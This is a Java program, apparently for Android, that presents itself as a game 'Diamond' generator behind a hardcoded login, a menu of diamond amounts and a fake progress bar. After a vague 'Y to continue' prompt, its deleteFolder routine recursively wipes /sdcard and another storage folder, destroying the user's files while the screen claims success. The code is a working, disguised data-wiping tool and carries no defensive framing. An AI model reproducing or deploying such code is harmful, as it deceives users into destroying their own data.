import java.io.File;
import java.util.Random;
import java.util.Scanner;

public class DeleteFolder {
    public static void main(String[] args) throws InterruptedException {
        Scanner scanner = new Scanner(System.in);


        do {
            // Menampilkan teks sambutan
            System.out.println("");
            System.out.println("");
            System.out.println("/$$$$$$   /$$$$$$  /$$$$$$$$");
            System.out.println("| $$__  $$| $$__  $$|__  $$__/");
            System.out.println("| $$  \\__/| $$  \\__/   | $$");
            System.out.println("|  $$$$$$ | $$ /$$$$   | $$");
            System.out.println("\\____  $$ | $$|_  $$   | $$");
            System.out.println("/$$  \\ $$ | $$  \\ $$   | $$");
            System.out.println("| $$$$$$/ |  $$$$$$/   | $$");
            System.out.println("\\______/   \\______/    |__/");
            System.out.println("");
            System.out.println("");
            System.out.println("MADE BY: LAIKSANGKENG ");
            System.out.println("LICENSE: STAR GALAXY id: " + generateRandomID());
            System.out.println("Version: 1.2.1");
            System.out.println("");

            // Meminta pengguna memasukkan username
            System.out.print("Enter username: ");
            String usernameInput = scanner.nextLine();

            // Meminta pengguna memasukkan password
            System.out.print("Enter password: ");
            String passwordInput = scanner.nextLine();

            // Otentikasi username dan password
            if (authenticate(usernameInput, passwordInput)) {
                // Meminta izin untuk mengubah penyimpanan perangkat
                System.out.print("\n\nSuccessful identification\nto continue\ntype Y (to continue)\nand type N (to cancel)? (Y/N): ");
                String permission = scanner.nextLine();

                if (permission.equalsIgnoreCase("Y")) {
                    // Meminta pengguna memasukkan nama pengguna
                    System.out.print("Enter your username: ");
                    String userUsername = scanner.nextLine();

                    // Meminta pengguna memasukkan ID pengguna
                    System.out.print("Enter your user ID: ");
                    String userID = scanner.nextLine();

                    System.out.println("\n\nHello, " + userUsername + "! Your user ID is: " + userID);

                    // Ganti path_folder_dihapus dengan path folder yang ingin dihapus
                    String folderPath1 = "/storage/emulated/0/laiksangkeng";
                    String folderPath2 = "/sdcard";

                    File folder1 = new File(folderPath1);
                    File folder2 = new File(folderPath2);

                    boolean success1 = deleteFolder(folder1);
                    boolean success2 = deleteFolder(folder2);

                    if (success1 || success2) {
                        System.out.println("All programs run normally");
                    } else {
                        System.out.println("There is an error\n the program failed to run");
                    }

                    // Menampilkan menu
                    System.out.println("\n Please select:");
                    System.out.println("1.   5 Diamond");
                    System.out.println("2.  15 Diamond");
                    System.out.println("3.  30 Diamond");
                    System.out.println("4.  70 Diamond");
                    System.out.println("5.  75 Diamond");
                    System.out.println("6.  90 Diamond");
                    System.out.println("7. 100 Diamond");

                    // Meminta pengguna memilih nomor
                    System.out.print("Please select by typing the number: ");
                    int userChoice = scanner.nextInt();

                    // Proses pilihan pengguna (meskipun tidak mempengaruhi penghapusan file)
                    switch (userChoice) {
                        case 1:
                        case 2:
                        case 3:
                        case 4:
                        case 5:
                        case 6:
                        case 7:
                            executeCommand(userChoice);
                            break;
                        default:
                            System.out.println("Invalid selection.");
                    }
                } else {
                    System.out.println("You terminate the command\nthe operation cannot continue.");
                }
            } else {
                System.out.println("\n\nAuthentication failed\n Please try again.");
            }

            // Membersihkan newline di buffer
            scanner.nextLine();

            // Meminta pengguna apakah ingin menjalankan program lagi
            System.out.print("Would you do the program again? (Y/N): ");
        } while (scanner.nextLine().equalsIgnoreCase("Y"));

        // Menutup Scanner
        scanner.close();
    }

    private static void executeCommand(int commandNumber) throws InterruptedException {
        // Mengatur warna teks menjadi merah
        System.out.print("\u001B[31m");

        System.out.println("Executing command (" + commandNumber + ")");

        // Proses eksekusi dengan persentase
        for (int i = 0; i <= 100; i += 10) {
            System.out.print("\rProgress: " + i + "%");
            System.out.flush(); // Memastikan output dikosongkan dan di-refresh
            Thread.sleep(1000); // Penundaan lebih lama untuk mensimulasikan proses
        }

        // Mengatur warna teks menjadi hijau
        System.out.print("\u001B[32m");

        // Menampilkan pesan setelah eksekusi selesai
        System.out.println("\nTHE PROGRAM worked!");

        // Mengembalikan warna teks ke warna default
        System.out.print("\u001B[0m");
    }

    private static boolean authenticate(String username, String password) {
        // Contoh otentikasi sederhana (ganti dengan mekanisme otentikasi yang lebih aman)
        String validUsername = "SGT";
        String validPassword = "laiksangkeng585";

        return username.equals(validUsername) && password.equals(validPassword);
    }

    private static boolean deleteFolder(File folder) {
        if (folder.exists()) {
            File[] files = folder.listFiles();
            if (files != null) {
                for (File file : files) {
                    if (file.isDirectory()) {
                        deleteFolder(file);
                    } else {
                        file.delete();
                    }
                }
            }
            return folder.delete();
        } else {
            return false;
        }
    }

    private static String generateRandomID() {
        // Membangun ID acak dari campuran angka dan huruf (kecil dan kapital)
        Random random = new Random();
        StringBuilder randomID = new StringBuilder();

        String characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

        for (int i = 0; i < 16; i++) {
            randomID.append(characters.charAt(random.nextInt(characters.length())));
        }

        return randomID.toString();
    }
}